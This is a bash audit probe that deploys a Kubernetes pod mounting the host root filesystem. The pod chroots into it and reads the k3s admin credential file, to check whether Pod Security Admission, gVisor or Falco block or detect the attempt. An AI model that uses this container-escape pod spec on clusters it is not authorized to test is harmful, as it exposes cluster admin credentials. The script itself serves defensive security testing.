#!/bin/bash
. "$(dirname "$0")/generic.sh"

# Map the LAYER_NAME to the appropriate expected security properties for the audit report
case "$LAYER_NAME" in
  baseline|layer_1)
    INFO_HPM="Baseline and Layer 1: Host Path Mounting will be possible for containerd but not for gVisor."
    ;;
  layer_2)
    INFO_HPM="Layer 2: Host Path Mounting is BLOCKED by Pod Security Admission (baseline/restricted) in the Tenant namespaces."
    ;;
  layer_3)
    INFO_HPM="Layer 3: Host Path Mounting is Logged Falco. See in Probe Threat Detection if Falco alerts are generated for this activity."
    ;;
  *)
    log_audit_probe "[!] ERROR: Unknown LAYER_NAME: $LAYER_NAME"
    exit 1
    ;;
esac


log_audit_probe "[+] Probe - hostPath Mount Assessment"
APPLY_OUT=$(ssh -q "$TARGET_USER"@"$TARGET_IP" << EOF
cat << HOSTPATH | kubectl apply -n $NS_FRONT -f - 2>&1
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-test
  namespace: $NS_FRONT
spec:
  containers:
  - name: tester
    image: alpine
    command: ["/bin/sh", "-c", "chroot /hostfs bash -c 'cat /etc/rancher/k3s/k3s.yaml'"]
    volumeMounts:
    - mountPath: /hostfs
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /
HOSTPATH
EOF
)
sleep 5
HOSTPATH_OUT=$(ssh -q "$TARGET_USER"@"$TARGET_IP" "kubectl logs hostpath-test -n $NS_FRONT" 2>&1)
log_audit_probe "INFO: $INFO_HPM"
log_audit_probe "Apply Output: $APPLY_OUT"
log_audit_probe "Log Result: $HOSTPATH_OUT"
ssh -q "$TARGET_USER"@"$TARGET_IP" "kubectl delete pod hostpath-test -n $NS_FRONT --force --grace-period=0" > /dev/null 2>&1

# Self-classify
ALL_HP="$APPLY_OUT $HOSTPATH_OUT"
if echo "$ALL_HP" | grep -qi "forbidden\|denied\|violat"; then
    emit_result "hostPath Mount Assessment" "Prevented"
elif echo "$HOSTPATH_OUT" | grep -qi "clusters:\|apiVersion\|server:"; then
    emit_result "hostPath Mount Assessment" "Exploited"
else
    emit_result "hostPath Mount Assessment" "Exploited"
fi
log_audit_probe "----------------------------------------------------"

